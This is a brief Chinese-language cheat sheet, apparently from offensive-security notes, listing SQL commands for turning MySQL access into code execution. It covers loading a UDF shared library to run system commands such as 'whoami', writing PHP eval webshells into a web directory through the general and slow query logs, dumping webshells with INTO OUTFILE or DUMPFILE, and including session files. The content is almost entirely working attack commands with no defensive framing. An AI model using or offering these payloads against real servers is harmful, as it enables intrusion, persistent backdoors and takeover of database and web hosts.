## UDF

```sql
show variables like '%plugin%';
# 默认为/usr/lib/mysql/plugin/
select unhex('payloads') into dumpfile '/usr/lib/mysql/plugin/mysqludf.so';
create function cyy_udf_eval returns string soname 'mysqludf.so';
select cyy_udf_eval('whoami');
```

## mysql日志

> 需要的前置条件：知道web服务器发布路径

```sql
set global general_log='on';
set global  general_log_file ="D:/phpStudy/PHPTutorial/WWW/log1n.php";
select "<?php eval($_POST['chi1ema'])?>";
set global general_log='off';
show global variables like "%genera%";
# 慢查询日志
set global slow_query_log=1;
set global slow_query_log_file='dir\filename';
select "<?php @eval($_POST['chi1ema'])?>" or sleep(11);
show global variables like '%long_query_time%';

```

## webshell写入

> 需要：web服务器发布路径，secure_file_priv不等于null（my.ini my.cnf）

```sql
SHOW VARIABLES LIKE "secure_file_priv";
select '一句话木马' into outfile "/www/asda";
select '一句话木马' into dumpfile "/www/asda";
```

## 包含SESSION文件

```
tmp/sess_Cookie里的sessionID
```

